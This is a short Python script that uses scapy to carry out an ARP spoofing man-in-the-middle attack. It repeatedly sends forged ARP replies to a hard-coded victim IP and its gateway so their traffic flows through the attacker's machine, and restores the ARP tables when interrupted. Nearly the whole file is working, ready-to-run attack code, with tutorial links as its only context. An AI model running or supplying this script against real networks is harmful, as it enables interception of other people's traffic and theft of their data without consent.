import scapy.all as scapy
import time

#send the fake ARP message to A, and change A's ARP table entry corresponding to B IP to the
#attacker's MAC address, so that attacker gets his traffic

def set_attack(A_ip,B_ip):
    pkt = scapy.ARP(op=2,pdst=A_ip,psrc=B_ip,hwdst=mac_from_ip(A_ip))
    scapy.send(pkt,verbose=False)


def mac_from_ip(ip):
	arp_req = scapy.ARP(pdst = ip)						#set the required ip whose mac wants to be known as "ip"
	broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")	#send the packet out on a broadcast to the whole subnetwork

	arp_req_broadcast = broadcast / arp_req							#can automatically set common fields using this command

	answered_list = scapy.srp(arp_req_broadcast, timeout = 5, verbose = False)[0]		#assuming response from valid host, store his IP
	return answered_list[0][1].hwsrc


#reverse the attack by resetting the ARP table entries at A's table corresponding to B, back to
#B's MAC Address

def reverse_attack(A_ip,B_ip):
	pkt = scapy.ARP(op=2,pdst=A_ip,psrc=B_ip,hwdst=mac_from_ip(A_ip),hwsrc=mac_from_ip(B_ip))
	scapy.send(pkt,verbose=False)

attacker_ip = "10.7.53.242"							#change these fields depending on which
attacker_mac = "18-1D-EA-AE-6A-6E"					#machine is attacker, which is victim.
victim_ip = "10.7.56.141"                     
gateway_ip = "10.7.0.1" 

try:
	packets_sent = 0
	while True:
		set_attack(victim_ip,gateway_ip)				#updating the ARP table entries on victim's machine to
																		#make it think that my mac address is the gateway's
		set_attack(gateway_ip,victim_ip)												
		packets_sent = packets_sent + 2

		print("\r[*] Packets Sent "+str(packets_sent), end ="")
		time.sleep(2) 

except KeyboardInterrupt:							#press ctrl+C to exit execution
	print("Exiting")
	reverse_attack(gateway_ip, victim_ip)			#reverse the effects of the attack, reset table entries
	reverse_attack(victim_ip,gateway_ip)

	print("Attack stopped")

#References - https://www.programcreek.com/python/example/103599/scapy.all.ARP
#	    - https://www.geeksforgeeks.org/python-how-to-create-an-arp-spoofer-using-scapy/
#	    - https://mpostument.medium.com/arp-spoofer-with-python-and-scapy-b848d7bc15b3
